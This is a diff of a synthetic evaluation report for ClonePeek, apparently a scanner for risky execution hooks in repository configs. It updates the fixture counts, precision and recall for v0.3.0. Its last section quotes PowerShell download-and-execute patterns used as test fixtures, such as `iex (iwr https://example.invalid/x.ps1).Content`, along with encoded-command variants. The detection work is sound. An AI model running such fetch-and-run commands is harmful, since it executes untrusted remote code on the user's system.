@@ -1,6 +1,6 @@
-# Synthetic execution-config evaluation — ClonePeek v0.2.2
+# Synthetic execution-config evaluation — ClonePeek v0.3.0
 
-**These numbers are not real-world security detection accuracy.** All 46
+**These numbers are not real-world security detection accuracy.** All 51
 fixtures are small, consent-safe, intentionally hand-authored examples, not a
 random or representative sample of open-source repositories or attacks. They
 were constructed from known detection rules and modeled limitations. Their
@@ -32,19 +32,19 @@ domains. All created fixture data is deleted when evaluation finishes.
 
 | Outcome | Cases |
 | --- | ---: |
-| True positives | 15 |
-| False positives | 3 |
+| True positives | 18 |
+| False positives | 4 |
 | False negatives | 2 |
-| True negatives | 26 |
-| Total | 46 |
+| True negatives | 27 |
+| Total | 51 |
 
-**Precision = 15/18 = 83.3%. Recall = 15/17 = 88.2%.**
+**Precision = 18/22 = 81.8%. Recall = 18/20 = 90.0%.**
 This is a score on this designed fixture set, **not** a measured estimate
 for internet repositories. None of these labels says a given execution
 surface is malicious; the threshold indicates relative review urgency.
 
-Three **false positives** are harmless folder-open VS Code tasks
-(an `echo`, a hidden-terminal `echo`, and a syntax check). They are still
+Four **false positives** are harmless folder-open tasks (three VS Code,
+one Cursor), including the following VS Code examples: an `echo`, a hidden-terminal `echo`, and a syntax check. They are still
 real execution surfaces, which ClonePeek intentionally labels `high` by
 default. Two **false negatives** are dangerous behavior inside a
 referenced local script, which the scanner does not follow. Those still
@@ -63,7 +63,8 @@ high-risk classification or proof of malicious code.
 | devcontainer-lifecycle | 5 | 5 | 0 | 0 | 100% | 100% |
 | devcontainer-feature | 2 | 2 | 0 | 0 | 100% | 100% |
 | mcp-server-process | 5 | 5 | 0 | 0 | 100% | 100% |
-| claude-hook-command | 7 | 7 | 0 | 0 | 100% | 100% |
+| claude-hook-command | 8 | 8 | 0 | 0 | 100% | 100% |
+| cursor-hook-command | 4 | 4 | 0 | 0 | 100% | 100% |
 | config-parse | 2 | 2 | 0 | 0 | 100% | 100% |
 | oversize-config | 0 | 0 | 0 | 0 | n/a | n/a |
 | unreadable-config | 0 | 0 | 0 | 0 | n/a | n/a |
@@ -83,9 +84,11 @@ New synthetic fixtures cover `iwr ... | iex`,
 `iex (iwr https://example.invalid/x.ps1).Content`,
 the longer `Invoke-Expression (Invoke-WebRequest -Uri ...).Content`,
 `-EncodedCommand`, benign `Write-Host`, benign `Get-ChildItem`,
-and ordinary local PowerShell launch arguments. The new
+and ordinary local PowerShell launch arguments. v0.3.0 adds
+Cursor workspace-open, file-edit and encoded-command hook fixtures, plus
+a Claude local settings hook. The new
 expression-style download-and-execute examples **failed before the
-v0.2.2 detector fix** and classify as `critical` after it.
+v0.3.0 detector fix** and classify as `critical` after it.
 Harmless PowerShell examples do not classify as critical.
 
 ## Limitations and next evaluation step
